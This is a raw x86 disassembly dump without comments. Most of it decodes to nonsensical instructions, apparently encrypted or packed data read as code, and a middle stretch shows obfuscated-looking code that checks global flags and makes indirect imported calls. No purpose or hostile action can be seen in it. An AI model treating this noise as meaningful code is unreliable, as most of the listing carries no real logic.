  403355:	repnz imul esp,DWORD PTR [ebp+0x4828edb],0x79
  40335d:	sub    dh,bh
  40335f:	dec    edi
  403360:	cmc    
  403361:	add    al,0x6a
  403363:	cmp    bl,BYTE PTR [edx+0x5b]
  403366:	mov    ds:0x175e8f67,eax
  40336b:	jp     0x403318
  40336d:	sti    
  40336e:	and    esp,DWORD PTR [ebx+ebx*2-0x13a3afed]
  403375:	mov    edx,0xb98b7e68
  40337a:	add    DWORD PTR [ecx+0x49],ecx
  40337d:	cmp    al,0xb0
  40337f:	outs   dx,DWORD PTR ds:[esi]
  403380:	or     al,0x2e
  403382:	xor    DWORD PTR [ebp+0x39bd8ed5],ecx
  403388:	jge    0x40334b
  40338a:	xchg   edi,eax
  40338b:	aam    0x1c
  40338d:	mov    ah,0x41
  40338f:	jne    0x403388
  403391:	cmc    
  403392:	or     eax,0x402b2c7f
  403397:	daa    
  403398:	mov    BYTE PTR [ebp+0x51],cl
  40339b:	pop    eax
  40339c:	popf   
  40339d:	lahf   
  40339e:	rol    BYTE PTR ds:0x15686073,0xdb
  4033a5:	popf   
  4033a6:	arpl   WORD PTR [ebx+0x6e],bp
  4033a9:	loope  0x4033b1
  4033ab:	inc    BYTE PTR [esi+0x26]
  4033ae:	and    dl,BYTE PTR [ebx+0x399612c7]
  4033b4:	(bad)  
  4033b5:	rcr    BYTE PTR [eax-0x8],1
  4033b8:	push   cs
  4033b9:	push   edi
  4033ba:	test   BYTE PTR [eax],cl
  4033bc:	xor    BYTE PTR [ecx-0x2df36a60],dl
  4033c2:	mov    ebx,0x2d6deb7b
  4033c7:	popf   
  4033c8:	cmp    al,0x2
  4033ca:	xchg   esp,eax
  4033cb:	rcl    DWORD PTR [edx-0x67],1
  4033ce:	int3   
  4033cf:	adc    ch,BYTE PTR [eax+0x1b]
  4033d2:	push   ecx
  4033d3:	mov    eax,0x24e7ad3c
  4033d8:	out    0xd3,eax
  4033da:	cmp    edx,ebx
  4033dc:	jno    0x403360
  4033de:	pop    ebx
  4033df:	sti    
  4033e0:	nop
  4033e1:	in     eax,0x3d
  4033e3:	push   eax
  4033e4:	add    DWORD PTR [ecx+0x3e],esp
  4033e7:	mov    dl,0xb3
  4033e9:	xchg   edi,eax
  4033ea:	in     eax,0x73
  4033ec:	fs loopne 0x4033e1
  4033ef:	jmp    0xc11d533f
  4033f4:	sub    ah,ch
  4033f6:	fidivr WORD PTR ds:0xc766421f
  4033fd:	pushfw 
  4033ff:	das    
  403400:	xor    DWORD PTR [ecx+0x63],edx
  403403:	and    al,0x53
  403405:	jo     0x403456
  403407:	cdq    
  403408:	into   
  403409:	inc    esi
  40340a:	dec    BYTE PTR [ebx+0x4fbc1b61]
  403410:	(bad)  
  403411:	xchg   ebp,eax
  403412:	pop    edi
  403413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403414:	dec    edi
  403415:	jne    0x40347d
  403417:	mov    esp,0x2e1e4822
  40341c:	fsub   DWORD PTR [ebp+0x42]
  40341f:	cli    
  403420:	xlat   BYTE PTR ds:[ebx]
  403421:	add    eax,DWORD PTR [ebp+0x6e43b9a6]
  403427:	jl     0x4033d5
  403429:	push   ds
  40342a:	mov    ebx,0xb2485722
  40342f:	cmp    ecx,edx
  403431:	pop    es
  403432:	hlt    
  403433:	push   esi
  403434:	sub    DWORD PTR [edi-0x33],eax
  403437:	pop    eax
  403438:	dec    esp
  403439:	ror    DWORD PTR [edx+0x19],0xc2
  40343d:	or     esp,DWORD PTR [edi]
  40343f:	loop   0x4034ab
  403441:	xor    edx,DWORD PTR [esi+edx*8-0x66ae1125]
  403448:	xchg   ecx,eax
  403449:	push   eax
  40344a:	push   ebp
  40344b:	call   0x6c4eacbd
  403450:	inc    ebx
  403451:	dec    eax
  403452:	add    DWORD PTR [ebx-0x16],ebp
  403455:	push   0xffffff8e
  403457:	shl    BYTE PTR [ebx+0x68d7ffc5],0xe0
  40345e:	(bad)  
  40345f:	cs sahf 
  403461:	call   0xa8ab:0xa39bab81
  403468:	ret    
  403469:	bound  eax,QWORD PTR [ecx+0x2a]
  40346c:	(bad)  
  40346d:	data16 jbe 0x40340b
  403470:	(bad)  
  403471:	sti    
  403472:	push   ecx
  403473:	or     BYTE PTR [edx],ah
  403475:	xor    ebx,eax
  403477:	out    0xf8,al
  403479:	mov    esp,0x56156182
  40347e:	sar    BYTE PTR ds:0x12998278,1
  403484:	mov    DWORD PTR [ebx+edi*2-0x58183d2e],esi
  40348b:	leave  
  40348c:	jae    0x403429
  40348e:	daa    
  40348f:	push   esi
  403490:	or     ecx,DWORD PTR [ebp+0x517f2159]
  403496:	jge    0x4034cc
  403498:	push   ss
  403499:	fistp  DWORD PTR [ecx+0xb]
  40349c:	mov    es,ebp
  40349e:	in     al,dx
  40349f:	mov    ecx,DWORD PTR [ebx+0x5c]
  4034a2:	dec    esi
  4034a3:	mov    esp,0x2591a9a9
  4034a8:	das    
  4034a9:	jb     0x4034db
  4034ab:	in     al,0x15
  4034ad:	jle    0x403455
  4034af:	jno    0x403500
  4034b1:	xchg   esp,eax
  4034b2:	mov    bh,0xda
  4034b4:	mov    cl,0xb3
  4034b6:	cwde   
  4034b7:	(bad)  
  4034b8:	xchg   ebx,eax
  4034b9:	out    dx,al
  4034ba:	adc    al,0xc4
  4034bc:	popa   
  4034bd:	aam    0xe1
  4034bf:	dec    BYTE PTR [ebx]
  4034c1:	nop
  4034c2:	(bad)  
  4034c3:	fmul   QWORD PTR [eax]
  4034c5:	gs jae 0x4034b3
  4034c8:	jmp    0x4034ed
  4034ca:	inc    ebx
  4034cb:	sbb    edx,esi
  4034cd:	dec    edi
  4034ce:	sub    al,0xff
  4034d0:	(bad)  
  4034d1:	mov    esi,0x42ae768a
  4034d6:	iret   
  4034d7:	xor    DWORD PTR [ecx],eax
  4034d9:	dec    esi
  4034da:	push   cs
  4034db:	cld    
  4034dc:	add    al,0x7e
  4034de:	xchg   DWORD PTR [esi+edi*4],eax
  4034e1:	mov    al,ds:0xba0278d8
  4034e6:	pcmpeqd mm2,mm6
  4034e9:	cmp    DWORD PTR [ecx+0x4d8b8b3a],edx
  4034ef:	in     al,dx
  4034f0:	cmp    eax,DWORD PTR [ecx]
  4034f2:	mov    DWORD PTR ds:0x428163,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx-0x1],ch
  403514:	sub    eax,0xe5c36a08
  403519:	sbb    BYTE PTR [eax],bl
  40351b:	sahf   
  40351c:	adc    bl,BYTE PTR [eax]
  40351e:	sbb    dh,ah
  403520:	xchg   ecx,eax
  403521:	retf   
  403522:	sub    al,bh
  403524:	pushf  
  403525:	int3   
  403526:	js     0x40357b
  403528:	sti    
  403529:	mov    ds:0x279fde0c,al
  40352e:	sbb    ah,BYTE PTR [edi-0x52fac76e]
  403534:	jle    0x4034d5
  403536:	xchg   esi,eax
  403537:	in     eax,dx
  403538:	sti    
  403539:	psrld  mm6,mm5
  40353c:	test   eax,0x5fefec02
  403541:	add    cl,BYTE PTR [edx-0x35d0aba3]
  403547:	sub    al,0xf6
  403549:	cmp    ebx,0xf031fa34
  40354f:	(bad)  
  403550:	mov    ebp,0xe2757798
  403555:	pop    eax
  403556:	(bad)  
  403557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403558:	and    dl,dh
  40355a:	jo     0x403591
  40355c:	icebp  
  40355d:	xchg   bh,dh
  40355f:	pushf  
  403560:	xor    bh,0xef
  403563:	mov    esp,0xd6d025c1
  403568:	mov    bh,0x90
  40356a:	dec    edi
  40356b:	xchg   ebx,eax
  40356c:	dec    esi
  40356d:	pop    ss
  40356e:	xchg   BYTE PTR [eax-0xfb5e17],bl
  403574:	sub    al,0xc
  403576:	mov    ds:0x12031224,al
  40357b:	ss aad 0xc3
  40357e:	dec    edi
  40357f:	or     ah,BYTE PTR [ebp+0x75f5bf3c]
  403585:	sbb    BYTE PTR [edi+edi*4-0x10be0198],ah
  40358c:	ss fsubr st,st(2)
  40358f:	stos   DWORD PTR es:[edi],eax
  403590:	xor    eax,0x7f0d5527
  403595:	inc    ebp
  403596:	pop    es
  403597:	inc    edx
  403598:	js     0x403615
  40359a:	xor    DWORD PTR [ecx+0x87b6a05],edi
  4035a0:	ror    BYTE PTR [edx-0x28060cfa],1
  4035a6:	pop    ds
  4035a7:	out    dx,eax
  4035a8:	test   ebx,ecx
  4035aa:	cli    
  4035ab:	fxch   st(0)
  4035ad:	mov    ds:0x7b1a746a,eax
  4035b2:	ret    0xd6c9
  4035b5:	repz cs jl 0x4035c7
  4035b9:	jnp    0x40355f
  4035bb:	int3   
  4035bc:	lds    esi,FWORD PTR [ecx-0x59]
  4035bf:	fs xchg esp,eax
  4035c1:	adc    DWORD PTR [ebx],ecx
  4035c3:	and    BYTE PTR ss:[ebp-0x3096347f],dh
  4035ca:	mov    bh,0x5b
  4035cc:	jle    0x403586
  4035ce:	retf   
  4035cf:	inc    ebx
  4035d0:	push   esi
  4035d1:	push   ds
  4035d2:	sbb    BYTE PTR [ebx-0x626dba1a],0xe2
  4035d9:	xchg   BYTE PTR [eax+0x76],ch
  4035dc:	(bad)  
  4035dd:	add    al,0x4
  4035df:	jg     0x403618
  4035e1:	dec    edx
  4035e2:	dec    ebx
  4035e3:	cmp    al,0xe8
  4035e5:	push   cs
  4035e6:	mov    eax,0xeff7d4f3
  4035eb:	mov    ds:0xc773d66f,al
  4035f0:	jno    0x403604
  4035f2:	out    0x21,eax
  4035f4:	gs pop ebp
  4035f6:	or     eax,0x8ff7794b
  4035fb:	or     eax,0xc04e611d
  403600:	pop    esp
  403601:	xor    DWORD PTR [ecx],edi
  403603:	fsub   QWORD PTR [eax]
  403605:	dec    esi
  403606:	(bad)  
  403607:	xchg   esp,eax
  403608:	out    dx,al
  403609:	xchg   BYTE PTR [ebx+0x2],cl
  40360c:	ds add eax,0xe60c585d
  403612:	cld    
  403613:	dec    ecx
  403614:	and    eax,0x6b1ca1b4
  403619:	mov    ah,0x1f
  40361b:	stc    
  40361c:	sbb    BYTE PTR [ecx+esi*4-0x6a882ee8],cl
  403623:	loope  0x4035ed
  403625:	bound  esp,QWORD PTR [ebx+edi*4+0x1507ab94]
  40362c:	js     0x403680
  40362e:	ss aam 0xe
  403631:	mov    ds:0xa87d2b0,al
  403636:	add    ecx,ebx
  403638:	cmp    al,0xf0
  40363a:	push   edx
  40363b:	shr    al,1
  40363d:	test   eax,0x8a942da1
  403642:	sbb    BYTE PTR [ebx+ebp*2-0x4f],bl
  403646:	push   0xffffffea
  403648:	add    esi,DWORD PTR [edi-0x32152f4b]
  40364e:	jecxz  0x403694
  403650:	int3   
  403651:	jb     0x403618
  403653:	adc    BYTE PTR [esi+0x43ac0ff2],0xf9
  40365a:	mov    edx,0xb2f7a74b
  40365f:	mov    eax,ds:0xb974daef
  403664:	fbstp  TBYTE PTR [edi+edi*4+0xc]
  403668:	mov    edi,0x348e5428
  40366d:	or     ebx,esp
  40366f:	mov    esp,ecx
  403671:	mov    edi,0x454f005f
  403676:	mov    ebp,0xc85a696
  40367b:	cwde   
  40367c:	sub    DWORD PTR [ebp+edx*2+0x14c347cc],0x26
  403684:	fwait
  403685:	ins    DWORD PTR es:[edi],dx
  403686:	(bad)  
  403687:	test   BYTE PTR [edi-0x742bd012],dh
  40368d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40368e:	mov    cl,0xdc
  403690:	dec    edx
  403691:	mov    ds:0xa6f9de2b,al
  403696:	push   ebx
  403697:	push   0xfead6944
  40369c:	xchg   ebp,eax
  40369d:	retf   
  40369e:	rcr    ebx,0x90
  4036a1:	nop
  4036a2:	mov    eax,ds:0x1ca77ad
  4036a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036a8:	imul   eax,DWORD PTR [esi-0x3f],0x3990e451
  4036af:	cmp    bl,BYTE PTR [esi+0x20]
  4036b2:	push   ebp
  4036b3:	(bad)  
  4036b4:	pop    ecx
  4036b5:	inc    ebp
  4036b6:	test   DWORD PTR [ecx],edi
  4036b8:	mov    ebp,0x32a0fd5f
  4036bd:	push   ebp
  4036be:	dec    edi
  4036bf:	cld    
  4036c0:	(bad)  
  4036c1:	jne    0x40368f
  4036c3:	dec    esp
  4036c4:	jl     0x4036d2
  4036c6:	in     al,dx
  4036c7:	(bad)  
  4036c8:	jns    0x4036ac
  4036ca:	je     0x403660
  4036cc:	push   esi
  4036cd:	call   0x9ed9:0x1d26b1ff
  4036d4:	sub    al,0x5f
  4036d6:	mov    esi,DWORD PTR [edi+0x5c]
  4036d9:	mov    esi,0x86b6a909
  4036de:	inc    ebx
  4036df:	fisubr WORD PTR [ebp+ebx*8+0x36]
  4036e3:	aad    0x20
  4036e5:	ins    DWORD PTR es:[edi],dx
  4036e6:	addr16 inc ecx
  4036e8:	lods   eax,DWORD PTR ds:[esi]
  4036e9:	cmp    edi,DWORD PTR [edx+0x49]
  4036ec:	or     ah,BYTE PTR [eax-0x5a]
  4036ef:	je     0x4036b9
  4036f1:	mov    cl,0x8e
  4036f3:	lea    ebp,[ebp-0x4eee0c97]
  4036f9:	push   ebx
  4036fa:	dec    eax
  4036fb:	ja     0x4036d4
  4036fd:	ja     0x403739
  4036ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403700:	pop    es
  403701:	ret    
  403702:	and    eax,0x220292fb
  403707:	(bad)  
  403708:	jg     0x4036f5
  40370a:	mov    WORD PTR [edx+0x23],gs
  40370d:	push   eax
  40370e:	sub    al,0x1f
  403710:	or     BYTE PTR [esi+0x18ce2547],0x99
  403717:	es sub ah,0xcf
  40371b:	adc    al,0xac
  40371d:	adc    eax,0x5034d922
  403722:	das    
  403723:	inc    ebp
  403724:	gs repz mov ch,0xef
  403728:	stos   DWORD PTR es:[edi],eax
  403729:	cmp    DWORD PTR [esi],0xf69ad4b9
  40372f:	cdq    
  403730:	dec    esi
  403731:	inc    esp
  403732:	cli    
  403733:	inc    edx
  403734:	push   ebp
  403735:	push   ebx
  403736:	pop    eax
  403737:	maxps  xmm7,xmm5
  40373a:	pop    es
  40373b:	or     ch,ah
  40373d:	mov    edx,0x4a2bd047
  403742:	mov    ?,ecx
  403744:	pop    ebp
  403745:	fild   DWORD PTR [edx+0x7aa4c657]
  40374b:	cmp    eax,0x2fdd7a9a
  403750:	repnz inc ebp
  403752:	and    eax,0x73caa839
  403757:	add    eax,0x526a3de2
  40375c:	pop    ecx
  40375d:	std    
  40375e:	sub    dh,BYTE PTR [eax+eax*1]
  403761:	bound  esp,QWORD PTR [ebx+0x736c19f2]
  403767:	sbb    al,0xe
  403769:	push   ss
  40376a:	iret   
  40376b:	mov    bl,bh
  40376d:	fwait
  40376e:	aad    0xc1
  403770:	xor    DWORD PTR [eax],ecx
  403772:	push   ecx
  403773:	inc    ebx
  403774:	mov    DWORD PTR [ebp+0x7e],ecx
  403777:	stc    
  403778:	xor    eax,0xec89300e
  40377d:	sub    dh,BYTE PTR [edx-0x7958a5b5]
  403783:	jae    0x4037b7
  403785:	dec    ebp
  403786:	sar    DWORD PTR [edx-0x5816c107],cl
  40378c:	jb     0x403794
  40378e:	pop    eax
  40378f:	inc    esi
  403790:	jge    0x4037ae
  403792:	and    ch,BYTE PTR [eax-0x79]
  403795:	push   edi
  403796:	jp     0x40374d
  403798:	cli    
  403799:	xchg   edi,esi
  40379b:	xchg   bh,ah
  40379d:	repnz fs and edi,eax
  4037a1:	js     0x4037ff
  4037a3:	push   0x3a
  4037a5:	fwait
  4037a6:	cli    
  4037a7:	inc    ebx
  4037a8:	cmp    al,0xd9
  4037aa:	(bad)  
  4037ab:	not    BYTE PTR [edi]
  4037ad:	retf   0x209c
  4037b0:	outs   dx,BYTE PTR ds:[esi]
  4037b1:	xchg   ebx,eax
  4037b2:	pusha  
  4037b3:	je     0x40377d
  4037b5:	mov    esi,0xb1184aee
  4037ba:	dec    ebp
  4037bb:	daa    
  4037bc:	(bad)  
  4037bd:	jnp    0x4037a4
  4037bf:	sbb    DWORD PTR [eax+esi*1+0x71],0x762aee96
  4037c7:	dec    ebp
  4037c8:	aad    0x46
  4037ca:	push   0xb8148c1c
  4037cf:	mov    DWORD PTR [esi],esi
  4037d1:	ror    DWORD PTR [ebp+ebx*2-0x2ee7f90f],0x14
  4037d9:	pop    ecx
  4037da:	xchg   dh,ah
  4037dc:	(bad)
  4037e0:	out    0xfc,eax
  4037e2:	lea    ecx,[esi]
  4037e4:	jb     0x40378f
  4037e6:	pop    esi
  4037e7:	call   0x9e4be083
  4037ec:	pop    esp
  4037ed:	or     eax,0x4e67e6a3
  4037f2:	scas   al,BYTE PTR es:[edi]
  4037f3:	adc    bl,cl
  4037f5:	xor    ch,bh
  4037f7:	pop    ebx
  4037f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037f9:	mov    WORD PTR [eax-0x419d367b],es
  4037ff:	add    edx,ebp
  403801:	push   ebp
  403802:	or     ebp,DWORD PTR [ecx+0x64]
  403805:	xchg   ecx,eax
  403806:	(bad)  
  403807:	call   0x995ec16f
  40380c:	cmc    
  40380d:	outs   dx,DWORD PTR ds:[esi]
  40380e:	fist   WORD PTR [esi+eax*8+0x117f849b]
  403815:	xor    eax,edx
  403817:	jecxz  0x40383d
  403819:	es call 0xcecf8f0b
  40381f:	cmp    esp,ebp
  403821:	push   ebx
  403822:	jmp    0x1fdaed8f
  403827:	push   ds
  403828:	mov    edi,0xeb0a8bbf
  40382d:	add    al,0xfb
  40382f:	call   DWORD PTR ds:0x5eeb8422
  403835:	mov    ds:0xe640eb67,al
  40383a:	cmc    
  40383b:	cmp    dl,BYTE PTR [edi+ebx*4-0x623bfbd2]
  403842:	test   DWORD PTR [ecx-0x5f],ecx
  403845:	fistp  WORD PTR [ebx-0x63]
  403848:	sub    BYTE PTR [edx-0x3e00fcae],bh
  40384e:	enter  0xd03a,0x99
  403852:	inc    esi
  403853:	dec    edx
  403854:	add    eax,0xdb3d69ca
  403859:	(bad)  
  40385a:	push   ecx
  40385b:	mov    esp,0xe158dcd4
  403860:	(bad)  
  403861:	mov    ecx,0x66fb9792
  403866:	retf   
  403867:	mov    ds:0xc0713a22,eax
  40386c:	stc    
  40386d:	inc    esi
  40386e:	xor    al,0xbd
  403870:	push   esi
  403871:	addr16 call 0x132bfc58
  403877:	sub    al,BYTE PTR [ecx-0x45068af2]
  40387d:	data16 mov al,0x5f
  403880:	in     eax,dx
  403881:	or     DWORD PTR [esi],ebx
  403883:	mov    cl,0x17
  403885:	mov    ebp,0x7ca5da6f
  40388a:	dec    eax
  40388b:	jp     0x4038ee
  40388d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40388e:	int3   
  40388f:	mov    ds:0x2262d628,eax
  403894:	scas   eax,DWORD PTR es:[edi]
  403895:	shl    DWORD PTR [ebp+0x799eeb9f],1
  40389b:	jb     0x403883
  40389d:	xchg   ebp,eax
  40389e:	popa   
  40389f:	cmp    al,0xba
  4038a1:	je     0x40387f
  4038a3:	push   edi
  4038a4:	xchg   ebx,eax
  4038a5:	dec    ebx
  4038a6:	mov    ecx,DWORD PTR [esp+eiz*4]
  4038a9:	lods   eax,DWORD PTR ds:[esi]
  4038aa:	jg     0x4038f0
  4038ac:	and    al,0xae
  4038ae:	fdivr  QWORD PTR [eax-0xf]
  4038b1:	in     al,0x5
  4038b3:	cmc    
  4038b4:	test   ecx,esp
  4038b6:	pop    ss
  4038b7:	pop    eax
  4038b8:	mov    bh,0xdb
  4038ba:	dec    ecx
  4038bb:	xchg   ecx,eax
  4038bc:	(bad)  
  4038bd:	or     al,0xef
  4038bf:	(bad)  
  4038c0:	mov    dl,0x8e
  4038c2:	sub    al,0xd7
  4038c4:	out    0x15,eax
  4038c6:	es clc 
  4038c8:	jno    0x4038bf
  4038ca:	gs push ss
  4038cc:	test   eax,0x5f01df07
  4038d1:	(bad)  
  4038d2:	pusha  
  4038d3:	in     eax,0x54
  4038d5:	shl    DWORD PTR [ebx],1
  4038d7:	xchg   ebx,eax
  4038d8:	fdivr  st(0),st
  4038da:	jae    0x403911
  4038dc:	cli    
  4038dd:	adc    BYTE PTR [ebp+eax*8-0x75],dh
  4038e1:	inc    ebp
  4038e2:	hlt    
  4038e3:	cmp    DWORD PTR ds:0x428263,0x0
  4038ea:	not    DWORD PTR ds:0x42815b
  4038f0:	mov    ecx,DWORD PTR ds:0x428287
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x428263,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428ed8
  403913:	xor    edx,DWORD PTR ds:0x42824f
  403919:	neg    DWORD PTR ds:0x428263
  40391f:	xor    DWORD PTR ds:0x428157,0x12a5
  403929:	and    DWORD PTR ds:0x4283a7,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x42828b
  403939:	or     ecx,DWORD PTR ds:0x42823f
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x428163,0x0
  403949:	mov    DWORD PTR ds:0x4283a7,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x428163,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428dac
  40397f:	adc    DWORD PTR ds:0x428297,0x42817f
  403989:	sbb    DWORD PTR ds:0x428283,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x428383
  403999:	or     DWORD PTR ds:0x42825f,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x428287
  4039a7:	adc    edx,DWORD PTR ds:0x42826b
  4039ad:	mov    DWORD PTR ds:0x428287,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x42823f,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x4282a7,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x42829b,0x4283a7
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x42817b
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x428157,0x42831f
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x428163,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x42815b,0x4282f3
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x42826f,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x428287,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x428157,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x428283,0x0
  403a3e:	mov    DWORD PTR ds:0x42830f,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x4283a7
  403a57:	cmp    DWORD PTR ds:0x428283,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428d88
  403a6f:	mov    edx,DWORD PTR ds:0x42833f
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x4283d3
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x428183,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x428177,0x2089
  403aa2:	or     DWORD PTR ds:0x42815b,0x113b
  403aac:	mov    eax,ds:0x4223d0
  403ab1:	cmp    DWORD PTR ds:0x428183,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42824f
  403ac3:	mov    DWORD PTR ds:0x428233,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x428323,0x6b1a
  403adc:	mov    DWORD PTR ds:0x428183,0x1226
  403ae6:	cmp    DWORD PTR ds:0x428183,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x428123
  403af8:	call   DWORD PTR ds:0x428db0
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42824b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x42828f,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x42837b,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x42816b,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0xaa596788
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi+0x1181812],bl
  403b4b:	or     esp,DWORD PTR es:[edi]
  403b4e:	ins    BYTE PTR es:[edi],dx
  403b4f:	inc    esi
  403b50:	sti    
  403b51:	ret    
  403b52:	out    0xdf,al
  403b54:	and    DWORD PTR [eax-0x69],edx
  403b57:	std    
  403b58:	and    BYTE PTR [edi+eax*2-0x23],dh
  403b5c:	and    al,0x80
  403b5e:	jge    0x403b5d
  403b60:	popa   
  403b61:	xor    eax,0x6313c1a7
  403b66:	or     bl,BYTE PTR [edi-0x3e]
  403b69:	fadd   DWORD PTR [edx]
  403b6b:	and    al,0x38
  403b6d:	mov    ?,WORD PTR [ebx]
  403b6f:	jmp    0xa997:0xf07c9532
  403b76:	sbb    cl,BYTE PTR [eax+0x210f252d]
  403b7c:	mov    ch,bh
  403b7e:	aad    0xc6
  403b80:	sbb    bh,BYTE PTR [edx-0x49]
  403b83:	dec    edi
  403b84:	sub    eax,0x5b0eda8a
  403b89:	and    BYTE PTR cs:[eax],al
  403b8c:	mov    al,dl
  403b8e:	or     eax,0x50059ba0
  403b93:	mov    dh,0x7a
  403b95:	out    dx,al
  403b96:	out    0x97,al
  403b98:	std    
  403b99:	test   al,0x7d
  403b9b:	mov    eax,0x77e13351
  403ba0:	pop    eax
  403ba1:	in     eax,0xda
  403ba3:	ret    
  403ba4:	lods   eax,DWORD PTR ds:[esi]
  403ba5:	xor    edi,ecx
  403ba7:	dec    ebx
  403ba8:	jge    0x403bca
  403baa:	call   FWORD PTR [esi]
  403bac:	sub    eax,0x1501886f
  403bb1:	sub    dh,BYTE PTR [ebp-0x15]
  403bb4:	or     BYTE PTR [ebx],bh
  403bb6:	jnp    0x403bb0
  403bb8:	pop    esi
  403bb9:	inc    ecx
  403bba:	xchg   ecx,eax
  403bbb:	cli    
  403bbc:	xchg   edx,eax
  403bbd:	add    al,0xc2
  403bbf:	xor    edx,esi
  403bc1:	jmp    0xdd06:0x1d4779b8
  403bc8:	xor    eax,0x761f1f33
  403bcd:	xchg   esi,eax
  403bce:	push   edi
  403bcf:	loope  0x403bd6
  403bd1:	leave  
  403bd2:	adc    al,0xfa
  403bd4:	push   ebx
  403bd5:	inc    esp
  403bd6:	mov    bh,0x80
  403bd8:	jg     0x403bc6
  403bda:	out    0x52,al
  403bdc:	lods   al,BYTE PTR ds:[esi]
  403bde:	dec    edi
  403bdf:	jo     0x403c53
  403be1:	call   0xd876:0xd5eef453
  403be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403be9:	push   edi
  403bea:	jle    0x403bd1
  403bec:	cmovge esp,DWORD PTR [edi]
  403bef:	mov    cl,0xf4
  403bf1:	add    al,0xc3
  403bf3:	push   edx
  403bf4:	adc    BYTE PTR [eax+ebx*1],dl
  403bf7:	inc    ecx
  403bf8:	cmp    eax,0x7b299b04
  403bfd:	cs inc esp
  403bff:	jbe    0x403be6
  403c01:	imul   ebx,DWORD PTR [esi+0x2a6c28b],0x3efac080
  403c0b:	sub    cl,BYTE PTR [edx-0x5f]
  403c0e:	pop    ds
  403c0f:	scas   al,BYTE PTR es:[edi]
  403c10:	cwde   
  403c11:	lods   eax,DWORD PTR ds:[esi]
  403c12:	push   esi
  403c13:	call   0xf388:0x44042512
  403c1a:	shl    BYTE PTR [edi],1
  403c1c:	fdiv   DWORD PTR [eax+0x30a2f806]
  403c22:	mov    ebx,0xa8227549
  403c27:	and    BYTE PTR [ecx-0x3f79d166],cl
  403c2d:	cmp    ch,BYTE PTR [edi+0x45bfa748]
  403c33:	mov    dl,0x2a
  403c35:	dec    esp
  403c36:	add    bl,BYTE PTR [ecx+0x2f69e164]
  403c3c:	rol    ebp,cl
  403c3e:	pop    ss
  403c3f:	jle    0x403be2
  403c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c42:	(bad)  
  403c43:	popa   
  403c44:	inc    edi
  403c45:	inc    esp
  403c46:	icebp  
  403c47:	cdq    
  403c48:	inc    ebp
  403c49:	mov    ebp,0x381f0b7d
  403c4e:	jmp    0xac402ca8
  403c53:	sub    esp,DWORD PTR [eax+0x5cb426c]
  403c59:	xor    BYTE PTR [esi+0x51],ah
